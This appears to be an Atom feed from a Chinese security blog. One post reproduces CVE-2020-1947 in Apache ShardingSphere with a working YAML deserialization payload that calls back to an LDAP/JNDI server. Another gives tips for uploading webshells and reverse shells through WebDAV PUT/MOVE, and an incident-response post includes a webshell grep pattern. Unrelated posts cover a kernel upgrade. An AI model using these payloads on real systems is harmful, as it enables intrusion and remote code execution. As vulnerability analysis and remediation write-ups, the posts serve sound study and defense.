<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>HexChristmas&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hexchristmas.github.io/"/>
  <updated>2020-05-29T09:42:33.268Z</updated>
  <id>https://hexchristmas.github.io/</id>
  
  <author>
    <name>Hex Christmas</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-1947_ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析</title>
    <link href="https://hexchristmas.github.io/2020/05/29/CVE-2020-1947-ApacheShardingShpereUIYAML%E8%A7%A3%E6%9E%90%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/"/>
    <id>https://hexchristmas.github.io/2020/05/29/CVE-2020-1947-ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析/</id>
    <published>2020-05-29T09:37:51.000Z</published>
    <updated>2020-05-29T09:42:33.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-1947-ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析"><a href="#CVE-2020-1947-ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析" class="headerlink" title="CVE-2020-1947 ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析"></a>CVE-2020-1947 ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>shardingsphere是apache的一套开源生态系统，是一组分布式数据库中间件解决方案，是由sharding-jdbc、sharding-proxy和sharding-sidecar三款相互独立的框架组成，被用来提供数据分片，分布式事务，数据库治理</p><h2 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h2><p>ShardingSphere 4.0.0-RC3, 4.0.0　<br>sharding-jdbc,sharding-proxy,sharding-ui等组件</p><h2 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache-shardingsphere-incubating-4.0.0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java version &quot;1.8.0_231&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.8.0_231-b11)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.231-b11, mixed mode</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>shardingsphere的web控制台使用snakeyaml库进行解析yaml输入以加载数据源配置,snakeyaml允许unmarshal在不而被校验就可以进行解析并进行反序列化，<br><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/11.png" alt><br>unmarshal()直接将内容传入yaml.snakeyaml的load()解析<br><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/12.png" alt><br>此时unmarshal传要一个恶意yaml序列化内容就会导致RCE</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/HexChristmas/CVE-2020-1947</span><br><span class="line">cd CVE-2020-1947</span><br><span class="line">docker-compose.yml</span><br></pre></td></tr></table></figure><p>Poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;CVE-2020-1947&quot;,&quot;ruleConfiguration&quot;:&quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,&quot;dataSourceConfiguration&quot;:&quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:1389/CommandObject\n  autoCommit: true&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>Request<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /api/schema HTTP/1.1</span><br><span class="line">Host: 10.10.20.166:8089</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json;charset=utf-8</span><br><span class="line">Access-Token: eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsImJhc2U2NCI6eyJlbmNvZGVUYWJsZSI6WzY1LDY2LDY3LDY4LDY5LDcwLDcxLDcyLDczLDc0LDc1LDc2LDc3LDc4LDc5LDgwLDgxLDgyLDgzLDg0LDg1LDg2LDg3LDg4LDg5LDkwLDk3LDk4LDk5LDEwMCwxMDEsMTAyLDEwMywxMDQsMTA1LDEwNiwxMDcsMTA4LDEwOSwxMTAsMTExLDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyMSwxMjIsNDgsNDksNTAsNTEsNTIsNTMsNTQsNTUsNTYsNTcsNDMsNDddLCJkZWNvZGVUYWJsZSI6Wy0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDYyLC0xLDYyLC0xLDYzLDUyLDUzLDU0LDU1LDU2LDU3LDU4LDU5LDYwLDYxLC0xLC0xLC0xLC0xLC0xLC0xLC0xLDAsMSwyLDMsNCw1LDYsNyw4LDksMTAsMTEsMTIsMTMsMTQsMTUsMTYsMTcsMTgsMTksMjAsMjEsMjIsMjMsMjQsMjUsLTEsLTEsLTEsLTEsNjMsLTEsMjYsMjcsMjgsMjksMzAsMzEsMzIsMzMsMzQsMzUsMzYsMzcsMzgsMzksNDAsNDEsNDIsNDMsNDQsNDUsNDYsNDcsNDgsNDksNTAsNTFdLCJkZWNvZGVTaXplIjozLCJlbmNvZGVTaXplIjo0LCJQQUQiOjYxLCJwYWQiOjYxLCJ1bmVuY29kZWRCbG9ja1NpemUiOjMsImVuY29kZWRCbG9ja1NpemUiOjQsImxpbmVMZW5ndGgiOjAsImNodW5rU2VwYXJhdG9yTGVuZ3RoIjoyfSwiZ3NvbiI6eyJjYWxscyI6eyJ0aHJlYWRMb2NhbEhhc2hDb2RlIjoxMzk4MDMyNzAxfSwidHlwZVRva2VuQ2FjaGUiOnsiamF2YS5sYW5nLkRvdWJsZSI6e30sImphdmEudXRpbC5NYXBcdTAwM2Njb20uZ29vZ2xlLmdzb24ucmVmbGVjdC5UeXBlVG9rZW5cdTAwM2M/XHUwMDNlLCBjb20uZ29vZ2xlLmdzb24uVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLnJlZmxlY3QuUmVmbGVjdGlvbkFjY2Vzc29yIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuT2JqZWN0VHlwZUFkYXB0ZXIkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5Mb25nU2VyaWFsaXphdGlvblBvbGljeSI6e30sImNvbS5nb29nbGUuZ3Nvbi5UeXBlQWRhcHRlclx1MDAzYz9cdTAwM2UiOnt9LCJqYXZhLmxhbmcuQ2xhc3NcdTAwM2M/XHUwMDNlIjp7fSwiamF2YS5sYW5nLlN0cmluZyI6e30sImphdmEubGFuZy5Cb29sZWFuIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMwIjp7fSwiY29tLmdvb2dsZS5nc29uLkZpZWxkTmFtaW5nUG9saWN5JDEiOnt9LCJvcmcuYXBhY2hlLmNvbW1vbnMuY29kZWMuYmluYXJ5LkJhc2U2NCI6e30sImNvbS5nb29nbGUuZ3Nvbi5Mb25nU2VyaWFsaXphdGlvblBvbGljeSQxIjp7fSwiY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlRpbWVUeXBlQWRhcHRlciQxIjp7fSwiamF2YS5sYW5nLnJlZmxlY3QuVHlwZSI6e30sImphdmEudXRpbC5MaXN0XHUwMDNjY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyRmFjdG9yeVx1MDAzZSI6e30sImphdmEubGFuZy5CeXRlIjp7fSwiamF2YS5sYW5nLkludGVnZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5TcWxEYXRlVHlwZUFkYXB0ZXIkMSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLkpzb25BZGFwdGVyQW5ub3RhdGlvblR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLk1hcFR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImJ5dGUiOnt9LCJieXRlW10iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzQiOnt9LCJjb20uZ29vZ2xlLmdzb24uSW5zdGFuY2VDcmVhdG9yXHUwMDNjP1x1MDAzZSI6e30sIm9yZy5hcGFjaGUuc2hhcmRpbmdzcGhlcmUudWkuc2VjdXJpdHkuVXNlckF1dGhlbnRpY2F0aW9uU2VydmljZSI6e30sImNvbS5nb29nbGUuZ3Nvbi5pbnRlcm5hbC5iaW5kLlJlZmxlY3RpdmVUeXBlQWRhcHRlckZhY3RvcnkiOnt9LCJqYXZhLnV0aWwuTWFwXHUwMDNjamF2YS5sYW5nLnJlZmxlY3QuVHlwZSwgY29tLmdvb2dsZS5nc29uLkluc3RhbmNlQ3JlYXRvclx1MDAzYz9cdTAwM2VcdTAwM2UiOnt9LCJqYXZhLmxhbmcuVGhyZWFkTG9jYWxcdTAwM2NqYXZhLnV0aWwuTWFwXHUwMDNjY29tLmdvb2dsZS5nc29uLnJlZmxlY3QuVHlwZVRva2VuXHUwMDNjP1x1MDAzZSwgY29tLmdvb2dsZS5nc29uLkdzb24kRnV0dXJlVHlwZUFkYXB0ZXJcdTAwM2M/XHUwMDNlXHUwMDNlXHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLkdzb24iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMzUiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuQ29uc3RydWN0b3JDb25zdHJ1Y3RvciI6e30sImJvb2xlYW4iOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5EYXRlVHlwZUFkYXB0ZXIkMSI6e30sImphdmEudXRpbC5MaXN0XHUwMDNjY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5XHUwMDNlIjp7fSwiY29tLmdvb2dsZS5nc29uLlR5cGVBZGFwdGVyRmFjdG9yeSI6e30sImludCI6e30sImNvbS5nb29nbGUuZ3Nvbi5GaWVsZE5hbWluZ1N0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuVHlwZUFkYXB0ZXJzJDMzIjp7fSwiY29tLmdvb2dsZS5nc29uLkV4Y2x1c2lvblN0cmF0ZWd5Ijp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLmJpbmQuQXJyYXlUeXBlQWRhcHRlciQxIjp7fSwiZG91YmxlIjp7fSwiY29tLmdvb2dsZS5nc29uLmludGVybmFsLnJlZmxlY3QuUHJlSmF2YTlSZWZsZWN0aW9uQWNjZXNzb3IiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuRXhjbHVkZXIiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5UeXBlQWRhcHRlcnMkMjYiOnt9LCJjb20uZ29vZ2xlLmdzb24uaW50ZXJuYWwuYmluZC5Db2xsZWN0aW9uVHlwZUFkYXB0ZXJGYWN0b3J5Ijp7fX0sImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiZmFjdG9yaWVzIjpbbnVsbCxudWxsLHsidmVyc2lvbiI6LTEuMCwibW9kaWZpZXJzIjoxMzYsInNlcmlhbGl6ZUlubmVyQ2xhc3NlcyI6dHJ1ZSwicmVxdWlyZUV4cG9zZSI6ZmFsc2UsInNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXSwiZGVzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0seyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319LCJjb21wbGV4TWFwS2V5U2VyaWFsaXphdGlvbiI6ZmFsc2V9LHsiY29uc3RydWN0b3JDb25zdHJ1Y3RvciI6eyJpbnN0YW5jZUNyZWF0b3JzIjp7fSwiYWNjZXNzb3IiOnt9fX0sbnVsbCx7ImNvbnN0cnVjdG9yQ29uc3RydWN0b3IiOnsiaW5zdGFuY2VDcmVhdG9ycyI6e30sImFjY2Vzc29yIjp7fX0sImZpZWxkTmFtaW5nUG9saWN5IjoiSURFTlRJVFkiLCJleGNsdWRlciI6eyJ2ZXJzaW9uIjotMS4wLCJtb2RpZmllcnMiOjEzNiwic2VyaWFsaXplSW5uZXJDbGFzc2VzIjp0cnVlLCJyZXF1aXJlRXhwb3NlIjpmYWxzZSwic2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdLCJkZXNlcmlhbGl6YXRpb25TdHJhdGVnaWVzIjpbXX0sImpzb25BZGFwdGVyRmFjdG9yeSI6eyJjb25zdHJ1Y3RvckNvbnN0cnVjdG9yIjp7Imluc3RhbmNlQ3JlYXRvcnMiOnt9LCJhY2Nlc3NvciI6e319fSwiYWNjZXNzb3IiOnt9fV0sImV4Y2x1ZGVyIjp7InZlcnNpb24iOi0xLjAsIm1vZGlmaWVycyI6MTM2LCJzZXJpYWxpemVJbm5lckNsYXNzZXMiOnRydWUsInJlcXVpcmVFeHBvc2UiOmZhbHNlLCJzZXJpYWxpemF0aW9uU3RyYXRlZ2llcyI6W10sImRlc2VyaWFsaXphdGlvblN0cmF0ZWdpZXMiOltdfSwiZmllbGROYW1pbmdTdHJhdGVneSI6IklERU5USVRZIiwiaW5zdGFuY2VDcmVhdG9ycyI6e30sInNlcmlhbGl6ZU51bGxzIjpmYWxzZSwiY29tcGxleE1hcEtleVNlcmlhbGl6YXRpb24iOmZhbHNlLCJnZW5lcmF0ZU5vbkV4ZWN1dGFibGVKc29uIjpmYWxzZSwiaHRtbFNhZmUiOnRydWUsInByZXR0eVByaW50aW5nIjpmYWxzZSwibGVuaWVudCI6ZmFsc2UsInNlcmlhbGl6ZVNwZWNpYWxGbG9hdGluZ1BvaW50VmFsdWVzIjpmYWxzZSwiZGF0ZVN0eWxlIjoyLCJ0aW1lU3R5bGUiOjIsImxvbmdTZXJpYWxpemF0aW9uUG9saWN5IjoiREVGQVVMVCIsImJ1aWxkZXJGYWN0b3JpZXMiOltdLCJidWlsZGVySGllcmFyY2h5RmFjdG9yaWVzIjpbXX19</span><br><span class="line">Referer: http://10.10.20.166:8089/</span><br><span class="line">Content-Length: 595</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;CVE-2020-1947&quot;,</span><br><span class="line">  &quot;ruleConfiguration&quot;: &quot;  encryptors:\n    encryptor_aes:\n      type: aes\n      props:\n        aes.key.value: 123456abc\n    encryptor_md5:\n      type: md5\n  tables:\n    t_encrypt:\n      columns:\n        user_id:\n          plainColumn: user_plain\n          cipherColumn: user_cipher\n          encryptor: encryptor_aes\n        order_id:\n          cipherColumn: order_cipher\n          encryptor: encryptor_md5&quot;,</span><br><span class="line">  &quot;dataSourceConfiguration&quot;: &quot;!!com.sun.rowset.JdbcRowSetImpl\n  dataSourceName: ldap://127.0.0.1:1389/ExportObject\n  autoCommit: true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONS</span><br><span class="line">Access-Control-Max-Age: 3600</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Access-Control-Allow-Headers: Content-Type,Access-Token</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Date: Wed, 11 Mar 2020 02:49:39 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 97</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:false,&quot;errorCode&quot;:400,&quot;errorMsg&quot;:&quot;data source configuration is invalid.&quot;,&quot;model&quot;:null&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/HexChristmas/CVE-2020-1947/master/img/13.png" alt></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>目前，Apache官方已发布新的版本4.1.0，请尽快升级到官方最新版本。</p><p><a href="https://github.com/apache/incubator-shardingsphere/releases" target="_blank" rel="noopener">https://github.com/apache/incubator-shardingsphere/releases</a></p>]]></content>
    
    <summary type="html">
    
      CVE-2020-1947 ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析
    
    </summary>
    
    
      <category term="exploit" scheme="https://hexchristmas.github.io/tags/exploit/"/>
    
      <category term="ApacheShardingShpere" scheme="https://hexchristmas.github.io/tags/ApacheShardingShpere/"/>
    
  </entry>
  
  <entry>
    <title>ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析</title>
    <link href="https://hexchristmas.github.io/2020/05/29/ApacheShardingShpereUIYAML%E8%A7%A3%E6%9E%90%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/"/>
    <id>https://hexchristmas.github.io/2020/05/29/ApacheShardingShpereUIYAML解析远程代码执行漏洞复现及分析/</id>
    <published>2020-05-29T09:36:17.000Z</published>
    <updated>2020-05-29T09:36:17.502Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>危险的HTTP请求OPTIONS</title>
    <link href="https://hexchristmas.github.io/2020/05/29/%E5%8D%B1%E9%99%A9%E7%9A%84HTTP%E8%AF%B7%E6%B1%82OPTIONS/"/>
    <id>https://hexchristmas.github.io/2020/05/29/危险的HTTP请求OPTIONS/</id>
    <published>2020-05-29T03:25:55.000Z</published>
    <updated>2020-05-29T03:37:33.562Z</updated>
    
    <content type="html"><![CDATA[<h1 id="危险的HTTP请求OPTIONS"><a href="#危险的HTTP请求OPTIONS" class="headerlink" title="危险的HTTP请求OPTIONS"></a>危险的HTTP请求OPTIONS</h1><h2 id="为什么要写这个？"><a href="#为什么要写这个？" class="headerlink" title="为什么要写这个？"></a>为什么要写这个？</h2><p>危险的HTTP请求这个看似很简单，也的确很简单，但是我遇到的很多客户都会问有关这个的一些非常愚蠢的问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 为什么请求方式一样，请求内容也差不多一个告警是中危，一个告警是低危？</span><br><span class="line">2. WebDAV是什么？我们业务中没有遇到啊？</span><br><span class="line">3. 我们业务中都需要啊？使用了这么多年也没发生什么问题</span><br></pre></td></tr></table></figure></p><p>你不解释明白了，人家就觉得你技术不行，很可能转身就要投诉你，WTF？</p><h2 id="什么是WebDav？"><a href="#什么是WebDav？" class="headerlink" title="什么是WebDav？"></a>什么是WebDav？</h2><p>它是基于HTTP1.1协议的通信协议，可用于处理Web服务器的文件,如果攻击者可以访问这些功能，那么这些方法就可以为攻击者攻击提供很好的途径，WebDav是HTTP Method统一的叫法，HTTP可以使用除GET和POST以外的其他办法比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-PUT        /*将文件上传到指定位置*/</span><br><span class="line">-DELETE     /*删除指定的资源*/</span><br><span class="line">-COPY       /*将指定的文件复制到指定的位置*/</span><br><span class="line">-MOVE       /*将指定的文件移动到指定的位置*/</span><br><span class="line">-SEARCH     /*在目录路径中搜索资源*/  </span><br><span class="line">-PROPFIND   /*检索有关指定资源的信息*/</span><br></pre></td></tr></table></figure></p><p>我们测试一下<br><img src="/2020/05/29/危险的HTTP请求OPTIONS/2.png" alt><br>可以看到实际上是允许使用一些十分危险的请求的<br>此时攻击者直接就会在服务器上传shell.<br>我们尝试PUT一个一句话，我们会看到201创建成功的状态码<br><img src="/2020/05/29/危险的HTTP请求OPTIONS/3.png" alt><br>我们可以直接上传反向shell<br><img src="/2020/05/29/危险的HTTP请求OPTIONS/1.png" alt></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>如果存在这个安全问题，可以尝试使用PUT上传shell</li><li>如果直接上传shell报后缀名不被允许，你可以先以shell.txt方式上传再用MOVE更改后缀名，如果没有MOVE你可以使用COPY</li><li>如果都不行，你还可以试试上传jar文件或者一个包含请求头的html文件</li><li>不一定每个目录都有执行权限，所以我们在攻击中的需要进行递归权限检查，比如说davtest</li></ol><h2 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h2><p>在配置文件仅允许GET和POST的方法，其他危险的方法禁用即可</p>]]></content>
    
    <summary type="html">
    
      危险的HTTP请求这个看似很简单，也的确很简单，但是我遇到的很多客户都会问有关这个的一些非常愚蠢的问题
    
    </summary>
    
    
      <category term="Web安全" scheme="https://hexchristmas.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>centos7升级内核</title>
    <link href="https://hexchristmas.github.io/2020/05/29/centos7%E5%8D%87%E7%BA%A7%E5%86%85%E6%A0%B8/"/>
    <id>https://hexchristmas.github.io/2020/05/29/centos7升级内核/</id>
    <published>2020-05-29T02:09:16.000Z</published>
    <updated>2020-05-29T02:19:41.212Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos7升级内核"><a href="#centos7升级内核" class="headerlink" title="centos7升级内核"></a>centos7升级内核</h1><h2 id="centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑-升级内核５-14就自动把无线网卡装上了"><a href="#centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑-升级内核５-14就自动把无线网卡装上了" class="headerlink" title="centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑,升级内核５.14就自动把无线网卡装上了"></a>centos7默认是没有无线网卡的，但是我的程序又只能在cenos7上跑,升级内核５.14就自动把无线网卡装上了</h2><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br><span class="line">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org</span><br><span class="line">rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm</span><br><span class="line">yum --enablerepo=elrepo-kernel install kernel-ml</span><br><span class="line">awk -F\<span class="string">' '</span><span class="variable">$1</span>==<span class="string">"menuentry "</span> &#123;<span class="built_in">print</span> i++ <span class="string">" : "</span> <span class="variable">$2</span>&#125;<span class="string">' /etc/grub2.cfg //列出系统中可用的内核</span></span><br><span class="line"><span class="string">grub2-set-default 1 //将5.14内核设置为默认内核，你的５.14内核序号不一定是１</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;centos7升级内核&quot;&gt;&lt;a href=&quot;#centos7升级内核&quot; class=&quot;headerlink&quot; title=&quot;centos7升级内核&quot;&gt;&lt;/a&gt;centos7升级内核&lt;/h1&gt;&lt;h2 id=&quot;centos7默认是没有无线网卡的，但是我的程序又只能在c
      
    
    </summary>
    
    
      <category term="cetnos" scheme="https://hexchristmas.github.io/tags/cetnos/"/>
    
  </entry>
  
  <entry>
    <title>护网-XXE&amp;文件上传应急响应</title>
    <link href="https://hexchristmas.github.io/2020/05/18/%E6%8A%A4%E7%BD%91-XXE-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>https://hexchristmas.github.io/2020/05/18/护网-XXE-文件上传应急响应/</id>
    <published>2020-05-18T08:31:59.000Z</published>
    <updated>2020-05-18T08:39:58.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="护网-XXE-amp-文件上传应急响应"><a href="#护网-XXE-amp-文件上传应急响应" class="headerlink" title="护网-XXE&amp;文件上传应急响应"></a>护网-XXE&amp;文件上传应急响应</h1><h2 id="检测阶段"><a href="#检测阶段" class="headerlink" title="检测阶段"></a>检测阶段</h2><p>某天某公司应急，从态势感知看到几十条冰蝎触发的告警，因为都是加密的所以也看不出来红队操作的都是什么。从探针上看攻击者丧心病狂的在xxe高并发碰几率，还有一个上传成功的shell，我又看了告警事发前30分钟可疑流量和后30分钟的可疑流量除了冰蝎触发的告警也没有其他能溯源发现问题的。从日志检索上看没看到14的机器有像其他机器横向的攻击迹象，没有？你敢相信，没错就是态势感知没有。所以只能去受害主机上去排查。<br>开始对受害主机进行排查，打包所有jsp文件进行排查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /cms -name &quot;*.jsp&quot; -exectar-zcvf eee.tar.gz&quot;&#123;&#125;&quot;+</span><br></pre></td></tr></table></figure></p><p>然后开始查shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -RPn &quot;(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|php_uname|eval|tcpflood|udpflood|edoced_46esab) *\(&quot; eee</span><br></pre></td></tr></table></figure></p><p> 发现服务器/cms/fileupload/temp下有一个名字非常奇怪的jsp，这个目录正常情况下应该是图片，文档什么的出现这个肯定是非常可疑的，所以直接mv掉了<br> 接着我们在tmp下发现一个非常奇怪的文件g1t.1<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> ➜  ./g1t.1                                     </span><br><span class="line">Usage: gettitle -i 192.168.1.1/24 -p 80,443</span><br><span 